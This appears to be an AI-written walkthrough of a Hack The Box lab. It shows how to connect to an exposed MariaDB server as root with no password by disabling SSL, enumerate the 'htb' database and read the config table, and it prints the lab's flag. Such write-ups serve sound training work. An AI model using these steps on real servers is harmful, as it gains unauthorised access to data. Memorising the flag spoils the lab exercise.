# MySQL

#### **1. Tested Connectivity to the Target**

*   You used `ping` to test if the target server (`10.129.232.40`) was reachable:

    ```bash
    ping 10.129.232.40
    ```

    * Output showed intermittent connectivity with **33.3% packet loss**, but the server was reachable.

***

#### **2. Attempted MySQL Connection**

*   You tried connecting to the MySQL server using the `mysql` command:

    ```bash
    mysql -h 10.129.232.40 -u root
    ```

    * Result: **Error 2026** (TLS/SSL error), indicating the client attempted an SSL connection, but the server doesn’t support SSL.

***

#### **3. Troubleshot SSL Issues**

*   Attempted to disable SSL using the `--ssl-mode` option:

    ```bash
    mysql -h 10.129.232.40 -u root --ssl-mode=disabled
    mysql -h 10.129.232.40 -u root --ssl-mode=DISABLED
    ```

    * Both attempts failed with `unknown variable` errors, as `--ssl-mode` is not supported by your MariaDB client.
*   Successfully disabled SSL using the `--ssl=FALSE` option:

    ```bash
    mysql -h 10.129.232.40 -u root --ssl=FALSE
    ```

    * This successfully connected to the MariaDB server.

***

#### **4. Explored the MariaDB Server**

Once connected, you executed the following SQL queries:

**A. Listed Available Databases**

```sql
SHOW DATABASES;
```

* Output:
  * `htb`
  * `information_schema`
  * `mysql`
  * `performance_schema`

**B. Selected the Target Database (`htb`)**

```sql
USE htb;
```

* This switched your context to the `htb` database.

**C. Listed Tables in the `htb` Database**

```sql
SHOW TABLES;
```

* Output:
  * `config`
  * `users`

**D. Queried the `config` Table**

1.  Initial error due to incorrect query format:

    ```sql
    select * from config
    ```

    * Result: SQL syntax error.
2.  Correct query:

    ```sql
    SELECT * FROM config;
    ```

    *   Output:

        ```
        +----+-----------------------+----------------------------------+
        | id | name                  | value                            |
        +----+-----------------------+----------------------------------+
        |  1 | timeout               | 60s                              |
        |  2 | security              | default                          |
        |  3 | auto_logon            | false                            |
        |  4 | max_size              | 2M                               |
        |  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
        |  6 | enable_uploads        | false                            |
        |  7 | authentication_method | radius                           |
        +----+-----------------------+----------------------------------+
        ```

***

#### **Key Outcomes**

* You successfully connected to the MySQL/MariaDB server after disabling SSL.
* You enumerated the `htb` database and its tables.
*   You retrieved the contents of the `config` table, including the **flag**:

    ```
    7b4bec00d1a39e3dd4e021ec3d915da8
    ```

***

#### **Summary of Important Commands**

1.  Ping to test connectivity:

    ```bash
    ping 10.129.232.40
    ```
2.  Connect to the MariaDB server without SSL:

    ```bash
    mysql -h 10.129.232.40 -u root --ssl=FALSE
    ```
3.  SQL queries executed:

    ```sql
    SHOW DATABASES;
    USE htb;
    SHOW TABLES;
    SELECT * FROM config;
    ```

Let me know if you need further clarification or assistance! 🚀
